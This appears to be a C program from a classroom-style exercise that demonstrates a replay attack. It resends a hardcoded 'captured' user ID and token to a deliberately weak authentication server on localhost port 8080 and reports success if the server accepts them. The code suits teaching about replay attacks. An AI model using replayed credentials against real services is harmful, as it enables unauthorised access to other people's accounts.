#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    int captured_id = 2;
    int captured_token = 2;

    printf("=== ATTACK 1: REPLAY ATTACK ===\n");
    printf("Attacker intercepted previous communication:\n");
    printf("  Captured User_ID: %d\n", captured_id);
    printf("  Captured Token: %d\n\n", captured_token);
    printf("Launching Replay Attack...\n");
    printf("Sending captured credentials without knowing secret k\n");
    printf("Replayed: User_ID=%d, Token=%d\n\n", captured_id, captured_token);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in serv = {AF_INET, htons(8080), inet_addr("127.0.0.1")};

    if (connect(sock, (SOCKADDR*)&serv, sizeof(serv)) == 0) {
        send(sock, (char*)&captured_id, sizeof(captured_id), 0);
        send(sock, (char*)&captured_token, sizeof(captured_token), 0);

        char buffer[1024] = {0};
        int bytesReceived = recv(sock, buffer, 1024, 0); // Read the server's success/fail response
        
        if (bytesReceived > 0) {
            printf("Server response: %s\n\n", buffer);
            if (strstr(buffer, "SUCCESS")) {
                printf("V ATTACK SUCCESSFUL!\n");
                printf("Attacker authenticated as User_ID=%d without knowing k!\n", captured_id);
            }
        }
    } else {
        printf("X Connection Failed - Is the Weak Server running on Port 8080?\n");
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}